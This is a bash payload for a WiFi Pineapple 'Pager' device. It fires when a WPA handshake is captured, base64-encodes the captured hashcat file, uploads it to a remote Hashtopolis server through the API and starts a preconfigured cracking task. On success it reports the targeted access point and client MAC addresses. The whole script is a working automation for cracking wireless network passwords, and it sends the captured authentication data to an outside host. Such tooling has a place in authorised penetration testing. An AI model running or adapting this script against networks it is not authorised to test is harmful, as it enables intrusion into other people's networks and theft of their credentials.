#!/bin/bash
# Title: Hashtopolis Handshake Upload
# Description: Automatically uploads captured handshakes to Hashtopolis server via API
# Author: Your_Name
# Version: 2.2
# Category: Pineapple-Pager
#
# Requirements:
# - Active internet connection
# - Valid Hashtopolis server with API access
# - Preconfigured task created in Hashtopolis
# - config.sh file in same directory with settings

# =============================================================================
# LOAD CONFIGURATION
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="$SCRIPT_DIR/config.sh"

if [[ ! -f "$CONFIG_FILE" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Configuration file not found. Please create config.sh file."
    exit 1
fi

source "$CONFIG_FILE"

# =============================================================================
# VALIDATE CONFIGURATION
# =============================================================================

if [[ "$HASHTOPOLIS_URL" == *"example.com"* ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Server URL not configured. Edit config.sh to set HASHTOPOLIS_URL."
    exit 1
fi

if [[ "$API_KEY" == "YOUR_API_KEY_HERE" ]] || [[ -z "$API_KEY" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - API key not configured. Edit config.sh to set API_KEY."
    exit 1
fi

if [[ -z "$PRETASK_ID" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Pretask ID not configured. Edit config.sh to set PRETASK_ID."
    exit 1
fi

if [[ -z "$CRACKER_VERSION_ID" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Cracker Version ID not configured. Edit config.sh to set CRACKER_VERSION_ID."
    exit 1
fi

# =============================================================================
# TEST SERVER CONNECTION
# =============================================================================

CONNECTION_TEST=$(curl -s -m 10 -X POST "$HASHTOPOLIS_URL" \
    -H "Content-Type: application/json" \
    -d '{"section":"test","request":"connection"}' 2>&1)

if [[ $? -ne 0 ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Cannot connect to server. Check URL and internet connection."
    exit 1
fi

if ! echo "$CONNECTION_TEST" | jq -e '.response == "SUCCESS"' >/dev/null 2>&1; then
    ERROR_DIALOG "Hashtopolis Upload - Invalid API endpoint. Check HASHTOPOLIS_URL in config.sh."
    exit 1
fi

# =============================================================================
# TEST API KEY AUTHENTICATION
# =============================================================================

AUTH_TEST=$(curl -s -m 10 -X POST "$HASHTOPOLIS_URL" \
    -H "Content-Type: application/json" \
    -d "{\"section\":\"test\",\"request\":\"access\",\"accessKey\":\"$API_KEY\"}" 2>&1)

if [[ $? -ne 0 ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Cannot authenticate. Check network connection."
    exit 1
fi

if ! echo "$AUTH_TEST" | jq -e '.response == "OK"' >/dev/null 2>&1; then
    AUTH_ERROR=$(echo "$AUTH_TEST" | jq -r '.message // "Invalid API key"')
    ERROR_DIALOG "Hashtopolis Upload - Invalid API key. Error: $AUTH_ERROR. Generate key in Users > API Management."
    exit 1
fi

# =============================================================================
# VALIDATE HASHCAT FILE
# =============================================================================

if [[ ! -f "$_ALERT_HANDSHAKE_HASHCAT_PATH" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Hashcat file not found at $_ALERT_HANDSHAKE_HASHCAT_PATH"
    exit 1
fi

TIMESTAMP=$(date +%s)
UNIQUE_NAME="WPA_${_ALERT_HANDSHAKE_AP_MAC_ADDRESS}_${TIMESTAMP}"

# =============================================================================
# ENCODE FILE TO BASE64
# =============================================================================

FILE_DATA=$(base64 -w 0 "$_ALERT_HANDSHAKE_HASHCAT_PATH" 2>&1)

if [[ $? -ne 0 ]]; then
    ERROR_DIALOG "Hashtopolis Upload - File encoding error. Cannot encode hashcat file to base64."
    exit 1
fi

# =============================================================================
# UPLOAD HASHLIST
# =============================================================================

UPLOAD_JSON=$(cat <<EOF
{
  "section": "hashlist",
  "request": "createHashlist",
  "name": "$UNIQUE_NAME",
  "isSalted": false,
  "isSecret": $SECRET_HASHLIST,
  "isHexSalt": false,
  "separator": ":",
  "format": 0,
  "hashtypeId": $HASH_TYPE,
  "accessGroupId": $ACCESS_GROUP_ID,
  "data": "$FILE_DATA",
  "useBrain": $USE_BRAIN,
  "brainFeatures": $BRAIN_FEATURES,
  "accessKey": "$API_KEY"
}
EOF
)

UPLOAD_RESPONSE=$(curl -s -m 30 -X POST "$HASHTOPOLIS_URL" \
    -H "Content-Type: application/json" \
    -d "$UPLOAD_JSON" 2>&1)

if [[ $? -ne 0 ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Cannot reach server. Check internet connection."
    exit 1
fi

if echo "$UPLOAD_RESPONSE" | jq -e '.response == "ERROR"' >/dev/null 2>&1; then
    ERROR_MSG=$(echo "$UPLOAD_RESPONSE" | jq -r '.message // "Unknown error"')
    
    if echo "$ERROR_MSG" | grep -qi "brain"; then
        ERROR_DIALOG "Hashtopolis Upload - Hashcat Brain Error! $ERROR_MSG - Brain is enabled but not configured. Set USE_BRAIN=false in config.sh or configure Brain on server."
    else
        ERROR_DIALOG "Hashtopolis Upload - API Error: $ERROR_MSG"
    fi
    exit 1
fi

HASHLIST_ID=$(echo "$UPLOAD_RESPONSE" | jq -r '.hashlistId // empty')

if [[ -z "$HASHLIST_ID" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Hashlist ID not returned by server. Check server logs."
    exit 1
fi

# =============================================================================
# RUN PRECONFIGURED TASK
# =============================================================================

TASK_JSON=$(cat <<EOF
{
  "section": "task",
  "request": "runPretask",
  "name": "WPA_${_ALERT_HANDSHAKE_AP_MAC_ADDRESS}",
  "hashlistId": $HASHLIST_ID,
  "pretaskId": $PRETASK_ID,
  "crackerVersionId": $CRACKER_VERSION_ID,
  "accessKey": "$API_KEY"
}
EOF
)

TASK_RESPONSE=$(curl -s -m 30 -X POST "$HASHTOPOLIS_URL" \
    -H "Content-Type: application/json" \
    -d "$TASK_JSON" 2>&1)

if [[ $? -ne 0 ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Task creation timeout. Hashlist uploaded (ID: $HASHLIST_ID) but task creation failed."
    exit 1
fi

if echo "$TASK_RESPONSE" | jq -e '.response == "ERROR"' >/dev/null 2>&1; then
    ERROR_MSG=$(echo "$TASK_RESPONSE" | jq -r '.message // "Unknown error"')
    ERROR_DIALOG "Hashtopolis Upload - Task Error: $ERROR_MSG - Hashlist ID: $HASHLIST_ID - Verify Pretask ID: $PRETASK_ID and Cracker Version ID: $CRACKER_VERSION_ID"
    exit 1
fi

# =============================================================================
# SUCCESS NOTIFICATION
# =============================================================================

ALERT "Hashtopolis Upload - SUCCESS! Handshake uploaded. Hashlist ID: $HASHLIST_ID - AP: $_ALERT_HANDSHAKE_AP_MAC_ADDRESS - Client: $_ALERT_HANDSHAKE_CLIENT_MAC_ADDRESS - Type: $_ALERT_HANDSHAKE_TYPE"

exit 0